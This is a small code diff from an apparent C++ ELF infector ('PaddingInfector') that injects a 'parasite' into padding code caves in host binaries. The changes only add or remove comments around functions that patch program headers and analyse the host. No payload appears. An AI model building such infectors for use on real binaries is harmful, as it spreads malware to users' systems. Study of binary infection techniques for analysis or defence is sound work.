@@ -29,6 +29,7 @@ bool patch_sht(const Elf64_Ehdr& ehdr, Elf64_Shdr& shdr,
   return false;
 }
 
+// Patch program header to accommodate the parasite.
 void patch_phdr(Elf64_Phdr& phdr, uint64_t parasite_size_and_padding,
                 size_t patch_phdr_entry_idx) {
   auto phdr_entry = &phdr;
@@ -41,11 +42,6 @@ void patch_phdr(Elf64_Phdr& phdr, uint64_t parasite_size_and_padding,
 
 }  // namespace
 
-// Gather information about the elf that can be used to inject parasite into a
-// code cave.
-// @param host_mapping The host elf mapping.
-// @param parasite_size The size of the parasite.
-// @param[out] info A struct of information.
 bool PaddingInfector::analyze(std::span<const std::byte> host_mapping,
                               std::span<const std::byte> parasite_mapping) {
   const auto& ehdr = reinterpret_cast<const Elf64_Ehdr&>(host_mapping.front());
